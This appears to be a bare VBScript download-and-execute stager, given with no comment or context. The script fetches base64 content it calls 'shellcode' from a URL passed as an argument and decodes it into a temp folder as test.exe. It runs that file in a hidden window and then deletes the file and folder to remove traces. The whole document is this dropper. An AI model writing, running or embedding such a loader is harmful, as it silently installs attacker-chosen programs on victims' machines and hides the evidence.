strFileURL = WScript.Arguments.Item(0):Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", strFileURL, false:objXMLHTTP.send():shellcode = objXMLHTTP.responseText:strXML = "<B64DECODE xmlns:dt=" & Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & shellcode & "</B64DECODE>":Set oXMLDoc = CreateObject("MSXML2.DOMDocument.3.0"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode("B64DECODE").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject("Scripting.FileSystemObject"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir & "\" & fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir & "\" & "test.exe":Dim adodbstream:Set adodbstream = CreateObject("ADODB.Stream"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject("Wscript.Shell"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir):Set fso = Nothing 
